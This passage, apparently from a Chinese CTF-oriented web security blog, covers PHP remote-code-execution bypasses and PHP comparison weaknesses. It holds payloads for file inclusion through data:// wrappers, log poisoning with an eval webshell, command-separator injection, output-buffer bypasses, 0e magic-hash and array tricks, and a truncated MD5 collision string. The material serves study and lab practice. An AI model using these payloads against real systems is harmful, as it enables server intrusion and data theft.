class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=include$_GET[x]&amp;x=data:<span class="hljs-comment">//text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span><br>c=include$_GET[x]&amp;x=data:<span class="hljs-comment">//text/plain;base64,data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKSA/Pg==</span><br>?c=data:<span class="hljs-comment">//text/plain,&lt;?=system(&quot;ls&quot;)?&gt;      //短标签绕过php过滤</span><br></code></pre></td></tr></table></figure><h3 id="7-2-3-日志包含"><a href="#7-2-3-日志包含" class="headerlink" title="7.2.3 日志包含"></a>7.2.3 日志包含</h3><p>日志的相对位置需要去遍历目录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=include(../../../var/<span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span>)<br>UA:&lt;?php eval($_POST[<span class="hljs-string">&#x27;x&#x27;</span>]);?&gt;<br></code></pre></td></tr></table></figure><h3 id="7-2-3-针对文件包含的过滤"><a href="#7-2-3-针对文件包含的过滤" class="headerlink" title="7.2.3 针对文件包含的过滤"></a>7.2.3 针对文件包含的过滤</h3><p>传参伪协议</p><h2 id="7-3-highlight函数文件读取"><a href="#7-3-highlight函数文件读取" class="headerlink" title="7.3 highlight函数文件读取"></a>7.3 highlight函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//访问当前目录下的flag</span><br>c=highlight_file(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-comment">//通过相对路径访问上级目录的flag</span><br>c=highlight_file(<span class="hljs-string">&quot;../../../../../flag.txt&quot;</span>);<br><span class="hljs-comment">//自根目录访问下级目录中的flag</span><br>c=highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-4-show-source函数文件读取"><a href="#7-4-show-source函数文件读取" class="headerlink" title="7.4 show_source函数文件读取"></a>7.4 show_source函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">c=show_source(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>c=show_source(<span class="hljs-string">&quot;../../../../../flag.txt&quot;</span>);<br><br>c=show_source(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-5-readgzfile函数文件读取"><a href="#7-5-readgzfile函数文件读取" class="headerlink" title="7.5 readgzfile函数文件读取"></a>7.5 readgzfile函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">c=readgzfile(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>c=readgzfile(<span class="hljs-string">&quot;../../../../../flag.txt&quot;</span>);<br><br>c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-6-require-once函数文件读取"><a href="#7-6-require-once函数文件读取" class="headerlink" title="7.6 require_once函数文件读取"></a>7.6 require_once函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">c=require_once(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="7-7-函数嵌套文件枚举"><a href="#7-7-函数嵌套文件枚举" class="headerlink" title="7.7 函数嵌套文件枚举"></a>7.7 函数嵌套文件枚举</h2><p>​<code>getcwd()</code>​ 函数返回当前工作目录的路径。<br>​<code>scandir()</code>​ 函数列出指定目录中的所有文件和目录，并返回一个包含文件和目录名称的数组。<br>​<code>show_source()</code>​ 函数用于显示一个 PHP 文件的源代码<br>通过这三个函数，拼接出了flag.php文件，并使用<code>show_source</code>​输出。这里的<code>[2]</code>​要多尝试，flag文件的位置不一定会在第2位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">c=show_source(scandir(getcwd())[<span class="hljs-number">2</span>]);<br></code></pre></td></tr></table></figure><h2 id="7-8-函数嵌套文件读取"><a href="#7-8-函数嵌套文件读取" class="headerlink" title="7.8 函数嵌套文件读取"></a>7.8 函数嵌套文件读取</h2><p>这个函数拼接实际上是上面的复杂版，适用于<code>[]</code>​被过滤的情况，不能直接遍历<code>scandir</code>​数组，只能使用指针操作来获取特定文件，由于前两个文件是<code>.</code>​和<code>..</code>​，因此用<code>array_reverse</code>​函数从最后一个文件开始。由于指针操作函数的作用是返回值而非地址，因此不能嵌套使用，利用这种方式只能读取很有限的几个文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">读取最后一个文件<br>c=show_source(current(array_reverse(scandir(getcwd()))));<br>读取倒数第二个元素<br>c=show_source(next(array_reverse(scandir(getcwd()))));<br></code></pre></td></tr></table></figure><p>还可以用下面的这个函数实现同样功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));<br>c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><h1 id="八-缓冲区劫持"><a href="#八-缓冲区劫持" class="headerlink" title="八. 缓冲区劫持"></a>八. 缓冲区劫持</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当我们利用函数与命令对目录与文件进行读取时，获得的内容会被输出到缓冲区，但并没有立即发送到浏览器。<br>而本段代码中<code>ob_get_contents()</code>​ 获取当前输出缓冲区的内容（如果有的话），然后通过 <code>ob_end_clean()</code>​ 清空缓冲区。这些代码意味着，如果 PHP 代码执行过程中有任何输出，它将被捕获到变量 <code>$s</code>​ 中。然后通过对<code>$s</code>​的正则匹配将输出全部替换为<code>?</code>​，使我们无法获得flag。</p><h2 id="8-1-提前送出缓冲区"><a href="#8-1-提前送出缓冲区" class="headerlink" title="8.1 提前送出缓冲区"></a>8.1 提前送出缓冲区</h2><p>​<code>ob_flush()</code>​ 是用来将缓冲区的内容立即输出到浏览器，但它并不会改变缓冲区中的内容。<br>​<code>ob_end_flush()</code>​ 是用来将缓冲区的内容立即输出到浏览器，并清空缓冲区的内容。<br>利用这两个函数，可以在执行后续缓冲区操作前提前把内容输出<br>(这里的&#x2F;flag.txt是在根目录下的文件)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">c=var_export(glob(<span class="hljs-string">&#x27;*&#x27;</span>));ob_flush();<br>c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));ob_flush();<br><br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);ob_flush();<br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);ob_end_flush();<br>c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);ob_flush();<br>...<br></code></pre></td></tr></table></figure><h2 id="8-2-提前终止程序"><a href="#8-2-提前终止程序" class="headerlink" title="8.2 提前终止程序"></a>8.2 提前终止程序</h2><p>如果在脚本结束时（比如在 <code>exit()</code>​ <code>die()</code>​被调用时），输出缓冲区中还有未输出的内容，PHP 会自动刷新这些内容并将其输出到浏览器。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-built_in">exit</span>();<br>c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));die();<br><br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-built_in">exit</span>();<br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);die();<br>c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);die();<br>...<br></code></pre></td></tr></table></figure><h1 id="九-命令分隔符"><a href="#九-命令分隔符" class="headerlink" title="九. 命令分隔符"></a>九. 命令分隔符</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;    <br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];    <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);   <br>&#125;<span class="hljs-keyword">else</span>&#123;    <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><p>这里解释一下这个</p><ul><li><p>​<code>&gt;/dev/null 2&gt;&amp;1</code>​ 是一个 Linux Shell 重定向操作：</p><ul><li>​<code>&gt;/dev/null</code>​：将标准输出重定向到 <code>/dev/null</code>​，相当于丢弃输出。</li><li>​<code>2&gt;&amp;1</code>​：将标准错误（<code>2</code>​）重定向到标准输出（<code>1</code>​），也一起丢弃。</li></ul></li><li><p>这意味着任何命令的输出（包括结果与报错）都不会显示。</p></li></ul><h2 id="9-1-​-​-​-​-0a​命令分隔"><a href="#9-1-​-​-​-​-0a​命令分隔" class="headerlink" title="9.1 ;​,||​,&amp;​,&amp;&amp;​ %0a​命令分隔"></a>9.1 <code>;</code>​,<code>||</code>​,<code>&amp;</code>​,<code>&amp;&amp;</code>​ <code>%0a</code>​命令分隔</h2><p>先来看一下这几个字符的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">; <span class="hljs-comment">//分号，前面的命令被执行，后面的命令和&gt;/dev/null 2&gt;&amp;1拼接被丢弃  </span><br>| <span class="hljs-comment">//只执行后面那条命令  </span><br>|| <span class="hljs-comment">//只执行前面那条命令  </span><br>&amp; <span class="hljs-comment">//两条命令分别执行  </span><br>&amp;&amp; <span class="hljs-comment">//仅当前一条命令成功执行后才执行下一条命令</span><br>%<span class="hljs-number">0</span>a <span class="hljs-comment">//在URL编码中代表换行符，可以分隔或中断正常的指令</span><br></code></pre></td></tr></table></figure><p>于是构造以下Payloads。需要注意的是<code>&amp;</code>​ 在 <strong>URL</strong> 中是一个保留字符，其作用是分隔多个参数，因此不能直接用 <code>&amp;</code>​ 而必须用 <code>%26</code>​。此处仅示例最基础命令，其他命令同理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=ls;ls<br>?c=tac flag.php;ls<br><br>?c=ls||<br>?c=tac flag.php||  <br><br>?c=ls%<span class="hljs-number">26</span><br>?c=tac flag.php%<span class="hljs-number">26</span>  <br><br>?c=ls%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><br>?c=tac flag.php%<span class="hljs-number">26</span>%<span class="hljs-number">26</span> <br><br>?c=ls%<span class="hljs-number">0</span>A<br>?c=tac flag.php%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE（远程代码执行漏洞）</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP比较漏洞</title>
    <link href="/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP比较漏洞"><a href="#PHP比较漏洞" class="headerlink" title="PHP比较漏洞"></a>PHP比较漏洞</h1><h1 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h1><blockquote><p><a href="https://www.php.net/manual/zh/language.operators.comparison.php">php</a>中有两种比较的符号 <code>==</code>​ 与 <code>===</code>​</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span>;  <span class="hljs-comment">// ==  在进行比较的时候，会先将字符串类型转化成相同，再比较</span><br><span class="hljs-variable">$a</span> === <span class="hljs-variable">$b</span>; <span class="hljs-comment">// === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 </span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;PHP 8.0.0 之前，如果 string 与数字或者以数字开头的字符串进行比较， 则在&#x3D;&#x3D;​**&#x3D;&#x3D;比较前会将 string 转化为数字&#x3D;&#x3D;**​&#x3D;&#x3D;。&#x3D;&#x3D;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true </span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250417174634-5opnoh2.png" alt="image"></p><p><img src="/.com//image-20250417174637-541lm5p.png" alt="image"></p><p>实验结果：</p><ol><li>​<code>&quot;admin&quot;==0</code>​ 比较的时候，会将字符串<code>admin</code>​强制转化成整数<code>0</code>​</li><li>​<code>&quot;1admin&quot;==1</code>​ 比较的时候，会将字符串<code>1admin</code>​强制转化成整数<code>1</code>​</li><li>字符串<code>admin1</code>​强制转化成整数<code>0</code>​</li><li>​<code>&quot;0e123456&quot;==&quot;0e456789&quot;</code>​比较的时候，PHP会将开头为<code>0e</code>​这类字符串识别为科学计数法的数字，<code>0e123456</code>​相当于<code>&lt;span class=&quot;ne-text&quot;&gt;0*10&lt;/span&gt;&lt;sup&gt;123456&lt;/sup&gt;&lt;span class=&quot;ne-text&quot;&gt; = 0&lt;/span&gt;</code>​，同理，<code>0e456789=0</code>​，所以两者相等。</li></ol><blockquote><p>注意：例子中的字符串还有一个特征，<code>0e</code>​后面字符全是数字，才能漏洞利用，否则例如<code>0e3f2c44</code>​仍然会被识别成字符串。</p></blockquote><h1 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h1><p><img src="/.com//image-20250417174658-89jjpnd.png" alt="image"></p><p><img src="/.com//image-20250417174701-vej9ys6.png" alt="image"></p><p>&#x3D;&#x3D;当字符串被强制转化为数值，其结果和类型如下:&#x3D;&#x3D;</p><p>&#x3D;&#x3D;如果该字符串没有包含&#x3D;&#x3D;​&#x3D;&#x3D;​<code>&#39;.&#39;, e, E</code>​&#x3D;&#x3D;​&#x3D;&#x3D;并且其数值在整形范围之内，该字符串作为&#x3D;&#x3D;​&#x3D;&#x3D;​<code>int</code>​&#x3D;&#x3D;​&#x3D;&#x3D;来取值，其他所有情况下都被作为&#x3D;&#x3D;​&#x3D;&#x3D;​<code>float</code>​&#x3D;&#x3D;​&#x3D;&#x3D;来取值；&#x3D;&#x3D;</p><p>&#x3D;&#x3D;该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。&#x3D;&#x3D;</p><p>也印证了实验1中通过<code>&quot;admin1&quot;==1 =&gt;False</code>​</p><h1 id="0e绕过弱比较-MD5和SHA1函数漏洞"><a href="#0e绕过弱比较-MD5和SHA1函数漏洞" class="headerlink" title="0e绕过弱比较-MD5和SHA1函数漏洞"></a>0e绕过弱比较-MD5和SHA1函数漏洞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp;<span class="hljs-title function_ invoke__">MD5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) == <span class="hljs-title function_ invoke__">MD5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>  <br>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$s1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$s2</span>) &amp;&amp; <span class="hljs-variable">$s1</span>!=<span class="hljs-variable">$s2</span>)<br></code></pre></td></tr></table></figure><p>​<code>sha1</code>​和<code>md5</code>​属于哈希编码，在<code>PHP</code>​中，这两种编码是存在绕过漏洞的。</p><p>PHP在处理哈希字符串时，利用<code>!=</code>​或<code>==</code>​来对哈希值进行比较，把以<code>0e</code>​开头的哈希值都解释为<code>0</code>​，所以如果两个不同的密码经过哈希加密后，其哈希值都是以<code>0e</code>​开头的，那么<code>0e</code>​将会认为他们相同，都是<code>0</code>​。只需要传入开头都是<code>0e</code>​的两个值，比如<code>$s1=QNKCDZO</code>​,<code> $s2=240610708</code>​, 便可成功绕过。</p><p>利用<code>0e</code>​绕过方式只有在弱比较的时候才能使用。</p><h1 id="实验3"><a href="#实验3" class="headerlink" title="实验3"></a>实验3</h1><p><img src="/.com//image-20250417174743-u6bmulp.png" alt="image"></p><p><img src="/.com//image-20250417174746-61l5osn.png" alt="image"></p><p>以下值在<code>md5</code>​加密后以<code>0e</code>​开头：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">QNKCDZO<br><span class="hljs-number">240610708</span><br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br></code></pre></td></tr></table></figure><p>验证</p><p><img src="/.com//image-20250417174803-33e2qv1.png" alt="image"></p><p>批量验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">import hashlib<br><br>ants = [<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>, <span class="hljs-string">&#x27;240610708&#x27;</span>,<br>        <span class="hljs-string">&#x27;s878926199a&#x27;</span>, <span class="hljs-string">&#x27;s155964671a&#x27;</span>,<br>        <span class="hljs-string">&#x27;s214587387a&#x27;</span>, <span class="hljs-string">&#x27;s214587387a&#x27;</span>]<br><br><span class="hljs-keyword">for</span> ant in ants:<br>    cipher = hashlib.<span class="hljs-title function_ invoke__">md5</span>(ant.<span class="hljs-title function_ invoke__">encode</span>()).<span class="hljs-title function_ invoke__">hexdigest</span>()<br>    <span class="hljs-keyword">print</span>(f<span class="hljs-string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250417174815-hvdrbp5.png" alt="image"></p><p>以下值在<code>sha1</code>​加密后以<code>0e</code>​开头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">aaroZmOk<br>aaK1STfY<br>aaO8zKZF<br>aa3OFF9m<br><span class="hljs-number">0e1290633704</span><br><span class="hljs-number">10932435112</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">import hashlib<br><br>ants = [<span class="hljs-string">&#x27;aaroZmOk&#x27;</span>, <span class="hljs-string">&#x27;aaK1STfY&#x27;</span>,<br>        <span class="hljs-string">&#x27;aaO8zKZF&#x27;</span>, <span class="hljs-string">&#x27;aa3OFF9m&#x27;</span>,<br>        <span class="hljs-string">&#x27;0e1290633704&#x27;</span>, <span class="hljs-string">&#x27;10932435112&#x27;</span>]<br><br><span class="hljs-keyword">for</span> ant in ants:<br>    cipher = hashlib.<span class="hljs-title function_ invoke__">sha1</span>(ant.<span class="hljs-title function_ invoke__">encode</span>()).<span class="hljs-title function_ invoke__">hexdigest</span>()<br>    <span class="hljs-keyword">print</span>(f<span class="hljs-string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250417174829-y4ysat8.png" alt="image"></p><p>双重<code>MD5</code>​加密后<code>0e</code>​开头：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">import hashlib<br><br>ants = [<span class="hljs-string">&#x27;7r4lGXCH2Ksu2JNT3BYM&#x27;</span>,<br>        <span class="hljs-string">&#x27;CbDLytmyGm2xQyaLNhWn&#x27;</span>,<br>        <span class="hljs-string">&#x27;770hQgrBOjrcqftrlaZk&#x27;</span>]<br><br><span class="hljs-keyword">for</span> ant in ants:<br>    cipher = hashlib.<span class="hljs-title function_ invoke__">md5</span>(ant.<span class="hljs-title function_ invoke__">encode</span>()).<span class="hljs-title function_ invoke__">hexdigest</span>()<br>    cipher = hashlib.<span class="hljs-title function_ invoke__">md5</span>(cipher.<span class="hljs-title function_ invoke__">encode</span>()).<span class="hljs-title function_ invoke__">hexdigest</span>()<br>    <span class="hljs-keyword">print</span>(f<span class="hljs-string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250417174839-vxse526.png" alt="image"></p><blockquote><p>其它情况：会限制字符串为纯数字或字母</p></blockquote><p>‍</p><h1 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h1><p>对于php强比较和弱比较：<code>md5()</code>​，<code>sha1()</code>​函数无法处理数组，如果传入的为数组，会返回<code>NULL</code>​，所以两个数组经过加密后得到的都是<code>NULL</code>​，也就是相等的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>!==<span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))&#123;...&#125;<br></code></pre></td></tr></table></figure><p>​<code>payload: ?a[]=1&amp;b[]=2</code>​</p><p>‍</p><h1 id="实验4"><a href="#实验4" class="headerlink" title="实验4"></a>实验4</h1><p><img src="/.com//image-20250417174912-0qsam45.png" alt="image"></p><p><img src="/.com//image-20250417174914-tik3goc.png" alt="image"></p><p>‍</p><h1 id="实验5"><a href="#实验5" class="headerlink" title="实验5"></a>实验5</h1><p>查看报错信息去验证上述结论</p><p><img src="/.com//image-20250417174924-ovxj2mz.png" alt="image"></p><p><img src="/.com//image-20250417174927-4udg3hc.png" alt="image"></p><p>​<code>md5()</code>​函数希望接受的是字符串而不是数组。</p><p>‍</p><h1 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!==(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <br>   <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;...&#125;<br></code></pre></td></tr></table></figure><p>比较<code>a</code>​，<code>b</code>​时会将<code>a</code>​，<code>b</code>​转换为字符串比较，就不能用数组绕过了。因为数组转换为字符串时都会变成<code>&quot;Array&quot;</code>​。</p><p>‍</p><h1 id="实验6"><a href="#实验6" class="headerlink" title="实验6"></a>实验6</h1><p><img src="/.com//image-20250417174950-8fwszbt.png" alt="image"></p><p><img src="/.com//image-20250417174953-l3vi7qb.png" alt="image"></p><p>因为数组要求构造a和b不同，但是MD5相同，也就是说要求传入两个MD5相同的不同字符串。所以我们只能用MD5碰撞来实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=M%C9h%FF%<span class="hljs-number">0</span>E%E3%<span class="hljs-number">5</span>C%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>r%D4w%<span class="hljs-number">7</span>Br%<span 